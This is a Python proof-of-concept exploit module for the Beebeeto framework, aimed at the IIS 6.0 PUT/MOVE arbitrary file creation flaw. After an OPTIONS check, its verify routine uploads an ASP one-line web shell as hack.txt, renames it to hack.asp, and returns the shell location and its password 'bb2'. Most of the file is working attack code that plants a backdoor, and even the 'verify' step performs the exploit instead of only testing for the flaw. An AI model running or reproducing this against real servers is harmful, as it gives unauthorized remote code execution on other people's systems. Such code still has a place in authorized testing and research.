#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests
import urlparse
import httplib
import sys

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0043',
            'name': 'IIS 6.0 PUT 任意文件创建漏洞 Exploit',
            'author': '1024',
            'create_date': '2015-03-03',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'IIS',
            'vul_version': ['6.0'],
            'type': 'Arbitrary File Creation',
            'tag': ['IIS PUT 漏洞', 'IIS', 'IIS任意文件上传', 'IIS老漏洞'],
            'desc': "IIS配置不当导致的任意文件创建漏洞。",
            'references': ['http://www.lijiejie.com/python-iis-put-file/',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target']
        if verify_url.startswith(('http://', 'https://')):
            verify_url = urlparse.urlparse(verify_url).netloc
        if args['options']['verbose']:
            print '[*] Detection server type...'
        conn = httplib.HTTPConnection(verify_url)
        conn.request(method='OPTIONS', url='/')
        headers = dict(conn.getresponse().getheaders())
        if args['options']['verbose']:
            if headers.get('server', '').find('Microsoft-IIS') < 0:
                print '[-] This is not an IIS web server'
        if 'public' in headers and \
            headers['public'].find('PUT') > 0 and \
            headers['public'].find('MOVE') > 0:
            conn.close()
            conn = httplib.HTTPConnection(verify_url)
            # PUT hack.txt
            conn.request( method='PUT', url='/hack.txt', body='<%execute(request("bb2"))%>' )
            conn.close()
            conn = httplib.HTTPConnection(verify_url)
            # mv hack.txt to hack.asp
            conn.request(method='MOVE', url='/hack.txt', headers={'Destination': '/hack.asp'})
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['webshell'] = '%s/hack.txt' % verify_url
            args['poc_ret']['password'] = 'bb2'
            return args
        args['poc_ret']['false'] = '[-] Server not vulnerable'
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())